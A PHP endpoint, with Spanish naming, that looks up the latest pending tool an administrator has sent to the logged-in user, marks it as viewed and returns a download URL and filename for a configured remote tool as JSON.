<?php
error_reporting(E_ERROR | E_PARSE);

require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/remote_tool.php';

$usuario_id = verificarUsuarioSesion();

try {
    $pdo = conectarBD();

    $stmt = $pdo->prepare("
        SELECT h.id, h.pagina, h.admin_id, a.usuario AS admin_usuario
        FROM herramientas_enviadas h
        JOIN administracion_control a ON h.admin_id = a.id
        WHERE h.usuario_id = ?
        AND h.estado = 'pendiente'
        ORDER BY h.fecha_envio DESC
        LIMIT 1
    ");

    $stmt->execute([$usuario_id]);
    $herramienta = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($herramienta) {
        $updateStmt = $pdo->prepare("
            UPDATE herramientas_enviadas
            SET estado = 'visto',
                fecha_visto = CURRENT_TIMESTAMP,
                session_id = ?
            WHERE id = ? AND usuario_id = ?
        ");
        $updateStmt->execute([session_id(), $herramienta['id'], $usuario_id]);

        jsonResponse([
            'success' => true,
            'tiene_herramientas' => true,
            'pagina' => $herramienta['pagina'],
            'herramienta_id' => $herramienta['id'],
            'download_url' => REMOTE_TOOL_URL,
            'download_nombre' => REMOTE_TOOL_FILENAME,
        ]);
    }

    jsonResponse([
        'success' => true,
        'tiene_herramientas' => false,
    ]);
} catch (PDOException $e) {
    error_log('verificar_herramientas PDO: ' . $e->getMessage());
    jsonError('Error de base de datos', 500);
} catch (Exception $e) {
    error_log('verificar_herramientas: ' . $e->getMessage());
    jsonError('Error interno', 500);
}
